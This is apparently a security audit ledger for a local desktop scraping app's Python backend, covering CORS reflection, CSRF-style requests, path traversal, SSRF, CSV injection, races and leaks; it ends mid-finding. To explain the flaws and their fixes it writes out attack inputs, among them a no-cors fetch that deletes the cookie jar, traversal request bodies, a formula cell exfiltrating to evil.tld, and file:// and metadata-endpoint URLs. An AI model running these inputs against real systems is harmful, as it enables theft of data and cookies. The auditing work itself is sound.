# MCAT Backend Audit — Findings Ledger

Read-only audit of `packages/app/backend/`. Companion: [COVERAGE.md](COVERAGE.md).

**No app code was modified.** Fixes are described, never applied.

Round 1 complete · 3 reviewers → 37 raw findings → 1 merged, 36 verified
against source by 5 independent verifiers.

| | Count |
| --- | --- |
| Confirmed | 15 |
| Downgraded | 15 |
| Rejected (deleted) | 6 |
| Awaiting verification | 0 |

By severity, after verification: **1 critical · 6 high · 12 medium · 11 low**

---

## Threat model

MCAT is a **local, single-user macOS desktop app**: Svelte in a WKWebView
(pywebview) talking to a Python stdlib HTTP server on `127.0.0.1:9876`, scraping
via zendriver-driven Chrome with per-project platform cookies injected over CDP.
No remote server, no multi-user model.

Findings premised on a remote attacker, TLS, or multi-tenant isolation are out
of scope. Generic web-app boilerplate (security headers on a loopback server,
rate limiting, password policy, session expiry) does not apply.

**Severity scale.** `critical` — a local process, or a page the user merely
visits, steals cookies or gets code execution with no unusual user action.
`high` — same impact, needs a plausible user action. `medium` — silent data
corruption, wedging, or exfiltration behind an unlikely precondition. `low` —
hardening or a narrow race. Every finding states a one-line real-world impact.

---

# CRITICAL

## MCAT-023 · error-handling · critical

- **Location** — `mcat/core/batch_processor.py:199` (index source `:238`, `:80`)
- **Impact** — One blank URL cell silently shifts every subsequent result onto
  the **wrong row** of `results.csv` and drops the last row entirely. A
  researcher reads URL *A* marked with URL *B*'s status, with no error anywhere.
- **Trigger** — `get_urls_from_column` filters blanks (`csv_handler.py:72`:
  `... if r.get(url_column)`), but the coroutines are indexed with
  `enumerate(urls)` (`:238`) and then look up `original_rows[row_index]` (`:199`)
  against the **unfiltered** list passed at `:107`. With
  `rows = [A(url=a), B(url=""), C(url=c), D(url=d)]` → `urls = [a, c, d]`:
  `c`'s result lands in row B, `d`'s in row C, D is never written.
  `original_row.update({...})` (`:200-207`) overwrites only the six `mcat_*`
  fields, so the URL column keeps the *original* row's value — the mismatch is
  invisible. `len(urls) <= len(rows)` always, so no `IndexError` ever fires.
- **Reachable because** — `create_project` does `shutil.copy` of the source CSV
  verbatim (`project_service.py:48`), and `validate_job` only rejects a column
  that is *entirely* empty (`processing_validator.py:39-41`). This is the
  **default full-run path** (`urls=None`); the UI calls `processing.start()` with
  no arguments.
- **Fix** — Carry the source row with the URL instead of re-deriving a
  positional index: `[(row, normalize_url(row[col])) for row in rows if
  row.get(col)]`, and pass pairs into `gather`.
- **Verifier** — **confirmed**. Every link verified. Precision note: `DictReader`
  skips genuinely empty lines, so a trailing newline does *not* trigger it — the
  trigger is a blank URL cell in an otherwise-populated row (common in
  spreadsheet exports). Subset/tracking runs are unaffected (they filter blanks
  out, realigning indices).

---

# HIGH

## MCAT-001 · localhost-exposure · high

- **Location** — `mcat/server.py:29-35`; used at `:63`, `:82`, `:141`
- **Impact** — Any web page whose origin merely *contains* `localhost` or
  `127.0.0.1` gets full cross-origin **read** access to the whole MCAT API:
  project path, every run's results, the linked account id — and the first line
  of any readable file on disk.
- **Trigger** — `_get_cors_origin` is a substring test that **reflects** the
  origin back: `if origin and ("127.0.0.1" in origin or "localhost" in origin):
  return origin`. Two paths, both needing only a page view: (1) attacker
  registers `localhost.attacker.tld` (ordinary public DNS) — preflight returns
  `Access-Control-Allow-Origin: http://localhost.attacker.tld` plus
  `Allow-Headers: Content-Type`, so the JSON response is readable; (2) no
  attacker domain at all — any dev server the researcher visits
  (`http://localhost:5173`) is a permitted origin. The file-read primitive is
  real: `POST /csv/load {"path":"/any/file"}` → `csv.py:6-16` → `load_csv`
  (only guard is `os.path.exists`) → `get_columns` returns the file's first line
  split by the detected delimiter, plus a row count.
- **Fix** — Compare `Origin` against an exact allowlist built at startup
  (`http://127.0.0.1:<port>`, `http://localhost:<port>`, plus the Vite origin
  only when `is_dev`). Send no ACAO header at all otherwise.
- **Verifier** — **confirmed**. No `Allow-Credentials` is needed for this to
  matter — the server has no auth of any kind, so a reflected ACAO suffices.

## MCAT-002 · localhost-exposure · high

- **Location** — `mcat/server.py:71-77`, `:166-194`; routes `mcat/api/router.py:9-35`
- **Impact** — Any web page in the user's ordinary browser — no CORS
  relationship needed — can silently delete the saved platform cookie jar, start
  scrapes, create directories anywhere on disk, or arm a tracking loop that
  hammers the platform with the researcher's real logged-in account.
- **Trigger** — `_read_json_body` never inspects `Content-Type`; it parses
  whatever bytes arrive. Every state-changing route is an unauthenticated POST,
  so a CORS-safelisted simple request bypasses preflight and is delivered even
  though the response is opaque:
  ```js
  fetch('http://127.0.0.1:9876/auth/logout', {method:'POST', mode:'no-cors',
        headers:{'Content-Type':'text/plain'}, body:'{}'});
  ```
  → `auth.py:43-49` → `CookieStore.delete_cookies` → `path.unlink()`. Same
  one-liner against `/tracking/start` with `{"interval_value":0}`:
  `tracking.py:15` takes it unvalidated → `interval_seconds` = `0 * 60` = 0 →
  `threading.Timer(0, self._execute_tracking_run)` (`tracking_service.py:141`),
  with the busy-retry path at `Timer(5, ...)` — a scraping run every ~5s using
  the user's real session.
- **Fix** — Mint a random token at startup, pass it to the SPA the way `?port=`
  already is, and require it on every route; reject POSTs whose `Content-Type`
  is not exactly `application/json`, which alone forces a preflight that the
  MCAT-001 allowlist then fails.
- **Verifier** — **confirmed**. Also confirms the negative: `/process/start`'s
  `urls` field is **not** an injection vector — `processing_service.py:255-259`
  uses it only to filter rows already in `urls.csv`.

## MCAT-015 · leak · high

*Found independently by both the leak and structure reviewers.*

- **Location** — `mcat/services/processing_service.py:102` (`daemon=False`);
  `mcat/app.py:110-132`
- **Impact** — Closing the app window mid-run does not end the process. An
  invisible backend plus its headless Chrome survives, still holding port 9876,
  for the run's full remaining duration (hours). The user relaunches, the new
  instance binds the *next* port and starts its own Chrome — both accumulate one
  per relaunch.
- **Trigger** — `webview.start()` returns on window close → `main()` returns →
  interpreter shutdown **joins non-daemon threads** → `ProcessingWorker-<platform>`
  is still inside `asyncio.run(process_csv_async)` (`:271-279`). `app.py`'s
  `finally` only terminates Vite; there is no `closing`/`closed` handler and
  nothing calls `close_project()` or `cancel_processing()`. The HTTP/SSE threads
  are daemons (`app.py:90`), so the orphan keeps answering the whole time.
  With tracking enabled, "a run is in flight when the window closes" is the
  common case.
- **Fix** — Register a pywebview `closing` handler that calls
  `app_context.close_project()` + `cancel_processing()`, then joins the worker
  with a bounded timeout; make the worker `daemon=True` so a wedged batch can
  never hold the interpreter.
- **Verifier** — **confirmed**. Thread inventory verified: the worker is the
  **only** non-daemon thread in the app — the HTTP server (`app.py:90`), the
  tracking timers (`tracking_service.py:142`, `:154`) and the login thread
  (`login_service.py:45`) are all daemons.

## MCAT-021 · concurrency · high ~~critical~~

- **Location** — `mcat/core/browser_manager.py:191`, reached from `:172` and `:201`
- **Impact** — One unresponsive Chrome target during cookie injection wedges the
  worker thread permanently: `_processing_state` never returns to IDLE, every
  later `/process/start` is refused, and recovery is restart-only.
- **Trigger** — `_inject_cookies` does `await tab.send(cdp.network.set_cookies(...))`
  with **no `asyncio.wait_for`**, inside a `try/except` that cannot catch a hang.
  The `wait_for` at `:199` does **not** cover it — it closes on
  `self._browser.get(...)` at `:200`, and `await self._inject_cookies(tab)` is
  the *next* statement at `:201`. In vendored zendriver
  (`core/connection.py:752-757`), `Listener.listener_loop` breaks on
  `ConnectionClosedError` **without resolving pending Transaction futures**, and
  `send` ends in a bare `return await tx` with no deadline (`:569`) — so an
  in-flight send whose target dies hangs forever. Via `create()` (`:172`),
  `self._session` is assigned only *after* `create()` returns
  (`batch_processor.py:96`), so `cancel_processing` sees `None` and cannot stop
  the browser. Via `_open_tab` (`:201`) inside `release_tab`→`_recycle`, the tab
  is never re-pooled; after 3 such events (`max_zendriver_tabs: 3`) every
  coroutine blocks on `acquire_tab` and `gather` never completes.
- **Fix** — Wrap the `tab.send` in `asyncio.wait_for(..., HEALTH_CHECK_TIMEOUT)`,
  and bound `zd.start` in `create`. Independently, reset `_processing_state` from
  `cleanup()`/cancel rather than only from the worker's `finally`.
- **Verifier** — **downgraded, critical → high**. Mechanism confirmed exactly,
  including that `:199`'s `wait_for` does not cover the injection. Two caveats:
  `_inject_cookies` returns immediately when `_cookie_params` is empty (`:188-189`),
  so projects that never ran "Set up browser" are immune; and the trigger is a
  sub-millisecond race (the target must die inside the `set_cookies` round-trip),
  not a click sequence. Correction to the original claim: `cleanup()` also resets
  to IDLE (`:206-207`), though the wedged Chrome and non-daemon thread survive it.

## MCAT-022 · concurrency · high ~~critical~~

- **Location** — `mcat/api/handlers/processing.py:28`, with `mcat/services/run_service.py:57`
- **Impact** — A run that scrapes to completion is recorded permanently as
  `in_progress`: no `status_summary`, no `total_checked`, no `changes.csv`, and
  it is excluded from `get_completed_runs()` so it is never used as the diff
  baseline. Each refused Start also leaves a ghost `abandoned` run and an empty
  `runs/<ts>/` folder.
- **Trigger** — `processing.start` calls `run_service.start_run(...)` at `:28`
  **before** any eligibility check (the only prior check is `login_in_progress()`).
  `start_run` unconditionally sets `project_state.current_run = run`
  (`run_service.py:57`). `start_processing` then returns False, and `:60` calls
  `abandon_run`, which clears `current_run`. The **live** run's `on_completed`
  closure is gated on `ctx.current_project.current_run` (`:34`) — now `None` — so
  `complete_run` never fires. Two sequences: (a) Start → Abandon → Start, where
  the frontend's `IDLE_STATES` includes `'cancelled'`
  (`frontend/src/types/processing.ts:10`) so the UI re-renders Start while
  `_processing_state` is still CANCELLED; (b) the tracking timer calls
  `start_run` then does file I/O before `start_processing`, and a manual click in
  that window makes the tracking thread abandon the **manual** run that is
  actually executing (`tracking_service.py:200-201`).
- **Fix** — Reserve the slot before creating the run record: check
  `is_idle()` (or have `start_processing` atomically claim the state and return a
  token) *before* `start_run`. `project_state.current_run` also needs a single
  owner — two threads currently write it with no lock.
- **Verifier** — **downgraded, critical → high**. Every link verified including
  the frontend `IDLE_STATES` claim and the tracking window. The easily-reachable
  sequence (a) yields run-timeline pollution rather than a lost live run
  (`abandon` already finalized R1); the data-stranding outcome needs a direct
  double-`/process/start` or sequence (b)'s 10-100ms race. One correction: in (b)
  the clobbered manual run ends ABANDONED — it is the *tracking* run that is
  stranded IN_PROGRESS.

## MCAT-024 · error-handling · high

- **Location** — `mcat/services/tracking_service.py:175`; consumed at
  `mcat/services/processing_service.py:255-258`
- **Impact** — Scheduled tracking silently checks a **subset** of the project's
  URLs, or fails every interval forever with a nonsense error, whenever
  `urls.csv` contains scheme-less or whitespace-padded cells.
- **Trigger** — Tracking passes `urls = get_urls_from_column(...)`, which returns
  **normalized** URLs (`normalize_url` prepends `https://` *and* `.strip()`s —
  `csv_handler.py:60-67`). `_processing_worker` then filters the **raw** rows by
  exact string equality: `filtered = [r for r in rows if r.get(url_column) in
  custom_set]`. A cell `youtube.com/watch?v=x`, or `" https://youtu.be/x"` with a
  stray space, no longer equals its normalized form and is dropped. If *all* URLs
  are scheme-less: `filtered == []` → `save_csv` returns early without writing
  (`:42-43`) → `load_csv` on the 0-byte mkstemp file raises the generic
  `Exception(f"Error loading CSV file: {file_path}")` → the run is abandoned with
  a **temp-file path** shown in the UI log, every interval, forever.
- **Fix** — Normalize on both sides (`normalize_url(r.get(url_column, "")) in
  custom_set`), or have `start_processing` accept row indices / `mcat_index`
  rather than URL strings. Separately, raise a specific error when the selection
  matches zero rows.
- **Verifier** — **confirmed**. All four links verified. `normalize_url` exists
  precisely because the codebase expects scheme-less input, so this is the
  intended input class — and nothing normalizes on the way in (`create_project`
  copies the source CSV verbatim). Partial mismatch is the quieter case: those
  rows are silently dropped from every tracking run with no error at all.

---

# MEDIUM

## MCAT-003 · cookie-confidentiality · medium ~~high~~

- **Location** — `mcat/cookies/cookie_store.py:50`, `:59-63`
- **Impact** — Live platform session cookies sit in plaintext JSON in a
  user-chosen directory; if that directory is in Dropbox/iCloud/Drive or a git
  checkout, the researcher's social accounts are takeover-able by anyone with
  access to the sync account or the repo.
- **Trigger** — `path.write_text(...)` (`:59`) creates the file at umask default
  (0644) **before** the `os.chmod(path, 0o600)` on the next line — and that chmod
  sits in `except OSError: pass`, so on exFAT/SMB/network/FUSE volumes it
  silently leaves the jar world-readable with no warning. `self._dir.mkdir(...)`
  (`:50`) creates `cookies/` at 0755. Neither the repo `.gitignore` nor anything
  `create_project` writes covers `cookies/` — a project made inside a research
  repo has its jar committed by `git add -A`.
- **Fix** — Store the jar outside the project tree
  (`~/Library/Application Support/MCAT/<project-id>/`); create it with
  `os.open(..., O_CREAT|O_EXCL, 0o600)` so it is never briefly world-readable;
  surface the chmod failure instead of swallowing it; write a `cookies/` line
  into a per-project `.gitignore` as a backstop.
- **Verifier** — **downgraded, high → medium**. Ordering, swallow, mkdir mode and
  the missing `.gitignore` all verified. On a single-user macOS desktop any
  process running as the user reads the jar regardless of mode, so 0600 buys
  nothing against the realistic same-user threat — the exposure needs a second
  local principal or a synced/committed project dir.

## MCAT-004 · path-traversal · medium ~~high~~

- **Location** — `mcat/scrapers/youtube_scraper.py:25`;
  `mcat/scrapers/facebook_scraper.py:31`; sink `mcat/scrapers/base_scraper.py:148-159`
- **Impact** — One row in a CSV a researcher was sent writes a PNG to an
  arbitrary absolute path outside the project, creating missing parent
  directories along the way.
- **Trigger** — YouTube's override is `return url.split('v=')[-1].split('&')[0]`
  — it drops **both** the slash-splitting and the `ID_MAX_LEN` cap the base class
  applies (`base_scraper.py:101`). CSV cell
  `https://www.youtube.com/watch?v=/Users/victim/Library/LaunchAgents/x` with
  screenshots on → `rid` is absolute → `screenshot_dir / f"{rid}_{ts}.png"` makes
  pathlib **discard** `screenshot_dir` entirely. Vendored zendriver's
  `Tab.save_screenshot` calls `path.parent.mkdir(parents=True, exist_ok=True)`
  (`core/tab.py:1382`) before writing, so missing directories are created.
  `_save_screenshot` is reached on the `Unknown` and `Error` branches too
  (`:277-278`), so even a URL that fails to load still writes. Facebook has the
  same shape capped at 20 chars — still enough to be absolute (`?fbid=/tmp/pwn`).
- **Fix** — Sanitize in `_save_screenshot` rather than trusting each subclass:
  `rid = re.sub(r'[^A-Za-z0-9_-]', '_', rid)[:ID_MAX_LEN]`, then assert
  `filepath.resolve().is_relative_to(screenshot_base_path.resolve())`.
- **Verifier** — **downgraded, high → medium**. All mechanics confirmed,
  including the zendriver mkdir and that Twitter/Instagram are genuinely safe
  (every return path goes through `split("/")`). Severity capped because the
  write primitive is `<attacker-path>_YYYYMMDD_HHMMSS.png` containing PNG bytes —
  the attacker controls neither the trailing timestamp, the extension, nor the
  content, so the `LaunchAgents` example lands as `x_20260806_120000.png` and
  achieves no persistence. Requires the screenshots toggle (default `False`).

## MCAT-006 · path-traversal · medium

- **Location** — `mcat/api/handlers/run.py:69`, `:73`; sink
  `mcat/models/project_state.py:56-62`
- **Impact** — Reads any file named `results.csv` anywhere the user can read and
  returns its full contents as JSON, to an unauthenticated caller.
- **Trigger** — `run_id = body.get("run_id")` is checked only for truthiness,
  then `get_run_results_path(run_id)` joins it unguarded:
  `self.runs_path / run_id / "results.csv"`. `POST /run/results
  {"run_id":"../../../../Users/victim/Documents/private-study"}` returns that
  directory's `results.csv` as `{"columns":[...],"rows":[...]}`. Combined with
  MCAT-001, readable by a merely-visited web page.
- **Fix** — Look the run up first (`project.config.get_run(run_id)`) and 404 on
  miss; belt-and-braces, resolve and require `is_relative_to(project.runs_path)`.
- **Verifier** — **confirmed**. The contrast is real: `run.abandon` at `:17-19`
  *does* call `config.get_run` and raises "Run not found"; `get_results` does not.
  `get_changed_results` shares the same unvalidated join but additionally needs a
  `changes.csv` with the right columns in the traversed directory.

## MCAT-007 · path-traversal · medium

- **Location** — `mcat/services/project_service.py:38-48`, from
  `mcat/api/handlers/project.py:10-31`
- **Impact** — Creates a directory at an arbitrary absolute path and copies an
  arbitrary readable file into it, from an unauthenticated request.
- **Trigger** — The handler checks only field *presence*, then passes `name`,
  `location`, `csv_path` through raw. `project_path = location / name` — an
  **absolute** `name` discards `location` entirely (pathlib semantics); `:42`
  `mkdir(parents=True)` creates the chain; `:48` `shutil.copy` copies any
  readable file. The reviewer's `url_column: "{"` trick works: for a
  pretty-printed cookie jar the first line is `{`, which contains none of
  `, ; \t |`, so every delimiter yields `fieldnames == ["{"]` and `load_csv`
  falls through to `fallback` — so `url_column not in columns` is False and the
  `shutil.rmtree` cleanup at `:53` never runs.
- **Fix** — Reject any `name` that is not a single safe path component
  (`Path(name).name == name`, no `..`/separators), and require the resolved
  `project_path` to be a direct child of the resolved `location`.
- **Verifier** — **confirmed**. The `project_path.exists()` guard does hold, so
  this creates rather than clobbers. One correction to the exploit narrative: the
  copy is not left byte-identical — `create_project` ends with
  `ensure_url_indices` (`:67`), which rewrites `urls.csv` as CSV, so the file
  survives at the attacker-chosen path but reformatted.

## MCAT-008 · localhost-exposure · medium

- **Location** — `mcat/server.py:51-202` (no `Host` check anywhere in
  `MCATHandler`); `find_available_port` at `:38-48`
- **Impact** — DNS rebinding lets an attacker page become *same-origin* with the
  backend, sidestepping CORS entirely and reading every endpoint including the
  traversal-capable `/run/results`.
- **Trigger** — `do_GET`/`do_POST` read only `urlparse(self.path).path`;
  `self.headers` is touched only for `Content-Length` and `Origin`.
  `BaseHTTPRequestHandler` adds no Host check. Victim loads
  `http://rebind.attacker.tld:9876/` (TTL 1); the attacker flips the A record to
  `127.0.0.1`; once Chrome's pin expires the page is same-origin with MCAT.
  `DEFAULT_PORT = 9876` with only 10 attempts, so the port is guessable.
- **Fix** — Reject any request whose `Host` is not `127.0.0.1:<port>` or
  `localhost:<port>` with a 421, in one check at the top of
  `do_GET`/`do_POST`/`do_OPTIONS`.
- **Verifier** — **confirmed**. One correction: the attacker page must be served
  **from port 9876** for the rebound fetch to be same-origin; from port 80 it is
  cross-origin and `_get_cors_origin` returns `"null"`. Note MCAT-001 achieves the
  same read access with no DNS trickery at all, so fix that first.

## MCAT-009 · csv-injection · medium

- **Location** — `mcat/utils/csv_handler.py:132-141`; also `save_csv` `:40-50`
  and `run_service._write_changes_csv` `:184-190`
- **Impact** — `results.csv` opened in Excel/Numbers/LibreOffice executes
  attacker-authored formulas; the payload can come from whoever supplied the CSV
  or from the scraped page itself.
- **Trigger** — `append_row` hands `row_data` to `csv.DictWriter` with no
  neutralization of leading `=`, `+`, `-`, `@`, tab, or CR (the `csv` module
  quotes for parsing correctness only, which does not stop formula evaluation).
  **Passthrough path:** `batch_processor.py:199-208` copies every source column
  verbatim, including the URL cell — `normalize_url` is applied only to the
  scraping list, never to what is written. A cell
  `=HYPERLINK("http://evil.tld/?d="&A1&B1,"open report")` survives unchanged.
  **Scraped path:** `youtube_scraper.py:60-68` evaluates
  `[class*="warning"],[class*="restricted"]` innerText and returns
  `("Restricted", warn)` with up to 200 chars of arbitrary page text into
  `mcat_detail`.
- **Fix** — In `append_row`/`save_csv`/`_write_changes_csv`, prefix any string
  whose first character is in `=+-@\t\r` with a single quote, uniformly across
  passthrough and scraped fields.
- **Verifier** — **confirmed**, with corrections to the scraped path. Instagram's
  `("Unavailable", title)` is gated on the title containing "isn't available", and
  the **Twitter claim is false** — it returns `("Live", "N/A")` and its only
  page-derived return is gated on an exact `"X / ?"` match. The reviewer missed
  the strongest sink, YouTube's `Restricted` branch, recorded above.

## MCAT-010 · ssrf · medium

- **Location** — `mcat/utils/csv_handler.py:60-67`; sink
  `mcat/scrapers/base_scraper.py:237`
- **Impact** — A CSV cell makes the app's Chrome fetch and screenshot local
  files, other loopback services, and link-local metadata endpoints, depositing
  the rendered image into the project folder — which per MCAT-003 is often
  cloud-synced.
- **Trigger** — `normalize_url` prepends `https://` **only when `"://"` is
  absent**, so an explicit scheme passes straight through to
  `await asyncio.wait_for(tab.get(url), ...)`. Cells:
  `file:///Users/victim/Documents/interviews.pdf` → rendered and written to
  `<project>/runs/<id>/screenshots/unknown/*.png`;
  `http://127.0.0.1:8888/tree` (Jupyter), `http://169.254.169.254/latest/
  meta-data/iam/security-credentials/` → same capture path, reaching services
  that trust loopback.
- **Fix** — Restrict `normalize_url` to `http`/`https` (mark the row an error
  otherwise), and drop hosts resolving to loopback/link-local/private ranges
  before `tab.get`.
- **Verifier** — **confirmed**. No scheme or domain validation exists anywhere in
  `mcat/`. The `--allow-file-access-from-files` claim checks out — neither
  `BROWSER_ARGS` nor zendriver's defaults set it — so a `file://` page cannot read
  sibling files itself; the leak is the screenshot and title, not in-page reads.

## MCAT-014 · leak · medium ~~high~~

- **Location** — `mcat/core/browser_manager.py:255`; vendored zendriver
  `core/util.py:24`, `core/browser.py:376`, `core/connection.py:788-796`
- **Impact** — Every zendriver `Browser` from every run is retained for the life
  of the process, along with every CDP event it ever received. RSS grows per run
  and never returns to baseline.
- **Trigger** — Two mechanisms, both verified. (1) `Browser.start()` does
  `util.get_registered_instances().add(self)` into a module-global `set[Browser]`;
  a package-wide grep returns exactly the declaration, the getter and that one
  `add` — **no `discard`, `remove`, or `clear` anywhere** — and `Browser.stop()`
  never touches `self.targets`, so the whole `Connection` graph stays reachable.
  (2) `listener_loop` pops **only** command responses
  (`mapper.pop(message["id"])`, `:775`) while the event branch does
  `self.connection.mapper[event_tx.id] = event_tx` (`:796`) with no matching
  removal. `autodiscover_targets` defaults True, so every navigation, OOPIF and
  service worker adds retained `EventTransaction` futures — each pinning that
  run's event loop.
- **Fix** — In `BrowserSession.stop()`, after `await self._browser.stop()`:
  `zendriver.core.util.get_registered_instances().discard(browser)`, then
  `browser.targets.clear()` and clear `browser.connection.mapper` / `handlers`.
- **Verifier** — **downgraded, high → medium**. Both mechanisms verified exactly
  in the vendored library. Severity reduced to match realistic magnitude: MCAT
  holds one `Browser` per run at roughly a few hundred bytes per event — tens of
  MB for a typical run, growth across runs in a process the user restarts, not a
  fast OOM.

## MCAT-019 · leak · medium

- **Location** — `mcat/services/login_service.py:129-132`, `:48-54`; gate at
  `mcat/api/handlers/processing.py:21-22`
- **Impact** — A hung Set-up-browser teardown latches `_active` on, disabling
  **both** browser setup and every manual run until restart, while the visible
  Chrome window and its thread stay resident.
- **Trigger** — `_login_flow`'s `finally` ends with `await browser.stop()` with
  **no timeout** — unlike `BrowserSession.stop`, which the codebase deliberately
  bounds at 5s with the comment "stopping an already-dead browser can hang".
  `_active` is cleared only in `_run`'s `finally`, after `asyncio.run` returns.
  `Browser.stop` does `await self.connection.send(cdp.browser.close())`, and
  `send` ends in a bare `return await tx` with no deadline; if Chrome drops the
  websocket first, the listener breaks on `ConnectionClosedError` without failing
  pending transactions, so the await never returns. `login_in_progress()` then
  refuses every `/process/start` before doing anything else.
- **Fix** — Wrap the teardown as `BrowserSession.stop` does
  (`asyncio.wait_for(browser.stop(), timeout=...)`), and clear `_active` in
  `_login_flow`'s own `finally`.
- **Verifier** — **confirmed**. One mitigation the finding omits: `_get_login_service()`
  rebuilds the service when `_login_project_path` changes (`auth.py:18`), so
  opening a *different* project clears the wedge, and the thread is `daemon=True`
  so it does not block exit — "for the process lifetime" is really "until app
  restart or a project switch".

## MCAT-026 · error-handling · medium ~~high~~

- **Location** — `mcat/utils/csv_handler.py:140-141`
- **Impact** — A run that scraped every URL is recorded as **COMPLETED with zero
  results**, and because it becomes the previous completed run, the *next* run's
  change count is also 0 — a full interval of status changes disappears silently.
- **Trigger** — `append_row` catches every exception and `print`s to **stdout**,
  not through `log_callback` (`IncrementalCSVWriter` has no such field), so
  nothing reaches the log panel. Trigger with a full disk, a read-only volume, or
  the run folder removed mid-run. `process_single_url` still increments
  `processed` and `stats`, so the UI shows 100/100 healthy. At the end
  `process_csv_async:116-125` recomputes from the file: `load_csv` on a
  header-only CSV returns `[]`, `if result.rows:` is false, counters stay at zero
  defaults, and **`result.success = True` is set anyway**. `complete_run` writes
  an all-zero `status_summary`; the next run's `_compute_changes` bails at
  `run_service.py:152` and records nothing.
- **Fix** — Let `append_row` propagate (or count failures and expose them); route
  the warning through `log_callback`; refuse `result.success = True` when
  `processed_count` is materially below the URL count.
- **Verifier** — **downgraded, high → medium**. Mechanics fully confirmed
  including the unconditional `success = True`. Severity lowered because total
  row loss needs an environmental fault. A narrower non-environmental variant
  does exist: a ragged CSV row gets a `None` restkey from `DictReader`,
  `DictWriter.writerow` raises `ValueError`, and that single row is silently lost.

## MCAT-027 · concurrency · medium ~~high~~

- **Location** — `mcat/services/processing_service.py:65` (check) vs `:105-106` (set)
- **Impact** — Two worker threads run concurrently sharing **one**
  `BatchProcessor`: two browsers launch, cancel stops only one, progress counters
  oscillate, and one run's completion fires the *other* run's callback.
- **Trigger** — `is_idle()` takes and releases the lock, then ~40 lines of
  unguarded work run before `_processing_state = PROCESSING`. Two concurrent
  `/process/start` requests on two `ThreadingHTTPServer` threads both pass.
  Traced consequences: `_batch_processor` (`:93`), `_custom_urls` (`:80`) and
  `_on_completed`/`_on_error` (`:81-82`) are single fields overwritten by the
  second caller; `_loop`/`_session` are single-valued so cancel stops at most one
  browser.
- **Fix** — Claim the state inside one lock acquisition: hold `_state_lock` from
  the `is_idle` check through `_processing_state = PROCESSING`, returning False
  without side effects if the claim fails.
- **Verifier** — **downgraded, high → medium**. The gap and each consequence are
  mechanically confirmed, but the *stated* trigger does not reach the race: the
  handler does `start_run` (mkdir + JSON write) and `build_processing_job`
  (load_csv + cookie load) first — milliseconds — while the check-to-set window is
  tens of µs, so a human double-click (~50-200ms apart) lands entirely after the
  first request finished. Near-simultaneous arrival (tracking timer coinciding
  with a click) is required. Also missed: on the manual path `validate_job`
  re-checks the state (`processing_validator.py:20-22`), narrowing it further.
  Attribution correction: it is **run 1's** record that is stranded IN_PROGRESS.
  The deterministic bug a double-click *does* reach is MCAT-022.

## MCAT-030 · error-handling · medium

- **Location** — `mcat/services/processing_service.py:317-318`, caught at
  `:286-292`; `mcat/services/run_service.py:184-190`
- **Impact** — Both `on_completed` and `on_error` fire for one run: `complete_run`
  partially applies, then `abandon_run` overwrites it — a run that finished
  successfully is persisted as **ABANDONED**, and is then excluded from
  `get_completed_runs()` so the next run compares against an older baseline and
  that interval's changes are lost.
- **Trigger** — `_handle_completion` calls `self._on_completed(result)` with no
  exception guard, from inside the worker's `try`. If it raises, the worker's
  `except Exception` calls `self._on_error(str(e))` → `abandon_run`. Concrete
  raiser: `RunService.complete_run` → `_write_changes_csv`, whose `open()` is
  **bare** — unlike `_write_run_manifest`, `_compute_status_summary` and
  `_compute_changes`, which each wrap their I/O in `try/except` and log. At that
  point `complete_run` has already set `status = COMPLETED`, `completed_at`,
  `status_summary`, `total_checked` and `is_baseline` but has **not** reached
  `current_run = None` or `save()` — so `abandon_run` finds `current_run` still
  set, its id matches, and it flips the run to ABANDONED *and* is the call that
  persists it.
- **Fix** — Wrap the `_on_completed`/`_on_error` invocations in their own
  try/except so a callback failure is logged rather than re-entering the error
  path, and make `complete_run` atomic (compute everything, then commit).
- **Verifier** — **confirmed**. All four sub-claims verified including the
  partial-application ordering. One correction: the secondary raiser
  (`publish_project` → `get_url_count`) only touches disk when `_url_count < 0`
  and is cached after the first publish, so `_write_changes_csv` is the realistic
  path.

---

# LOW

## MCAT-011 · path-traversal · low

- **Location** — `mcat/api/handlers/dialog.py:109`; sink `:119`/`:123`
- **Impact** — The "inside the project" guard is a string-prefix test, so sibling
  paths sharing a prefix are treated as in-project and handed to `open`/`xdg-open`.
- **Trigger** — `is_project_path = str(resolved).startswith(str(project_dir))`.
  With the project at `/Users/victim/Documents/mcat`,
  `POST /dialog/open-external {"url":"/Users/victim/Documents/mcat-notes/x.csv"}`
  passes and is launched. The prefix-matching sibling is itself creatable via
  MCAT-007. Note the **unresolved** `target` is what reaches `Popen`.
- **Fix** — Use `resolved.is_relative_to(project_dir)`, and restrict the non-URL
  branch to an extension allowlist.
- **Verifier** — **confirmed**. `server.py:119` does this correctly with
  `is_relative_to` — the two containment checks in the same codebase disagree.

## MCAT-016 · leak · low ~~medium~~

- **Location** — `mcat/core/browser_manager.py:261`
- **Impact** — In the narrow hung-browser case, one Chrome temp profile
  (`/tmp/uc_*`, tens to hundreds of MB) and one unreaped child are left behind
  per affected run.
- **Trigger** — `Browser.stop()` always burns its full 3.0s terminate loop: it
  polls `self._process.returncode is not None` without ever calling `poll()`, and
  `returncode` stays `None` until `poll()`/`wait()` is called, so the loop never
  breaks early and always falls through to `kill()`. That leaves ~2.0s of MCAT's
  5s `HEALTH_CHECK_TIMEOUT` for the CDP close round-trip plus
  `to_thread(process.wait)` plus `rmtree`.
- **Fix** — Raise the cap to ~20s (it only needs to bound a *hang*, not a
  slow-but-working teardown) and on timeout kill `browser._process_pid` directly
  plus `rmtree(browser.config.user_data_dir)`. Separately, wrap the body of
  `BrowserSession.create` after `zd.start()` so a failed pool warm-up cannot
  orphan a browser (`session` is still `None` there, so the `finally`'s
  `session.stop()` is skipped).
- **Verifier** — **downgraded, medium → low**. The poll/3-second mechanics and the
  `shutdown_default_executor`-before-`loop.close()` ordering are both exactly
  right. But the reviewer never checked what `browser_atexit` actually does: it
  tests `stopped` (which calls `poll()`, **reaping the process**), skips `stop()`
  entirely in the normal timeout case, and runs an unconditional synchronous
  `_cleanup_temporary_profile()` — so the profile *is* removed on the common
  paths. Only a Chrome that ignored SIGTERM leaves both.

## MCAT-017 · leak · low ~~medium~~

- **Location** — `mcat/core/browser_manager.py:250` and `:199`
- **Impact** — On the exceptional timeout path, one orphaned CDP event-handler
  closure accumulates on the shared browser connection per event, never trimmed.
- **Trigger** — Both `Tab.close()` and `Browser.get()` do `add_handler(...)` →
  `await asyncio.wait_for(future, 10)` → `remove_handlers(...)` with the cleanup
  **after** the inner wait and no `try/finally`. MCAT's 5s cap is deliberately
  shorter than zendriver's internal 10s, so when the awaited event is slow the
  outer cancel always lands inside the inner wait and `remove_handlers` never
  executes. The `TimeoutError` is swallowed by `_recycle`'s bare `except`.
- **Fix** — Give the outer caps more headroom than zendriver's internal 10s waits
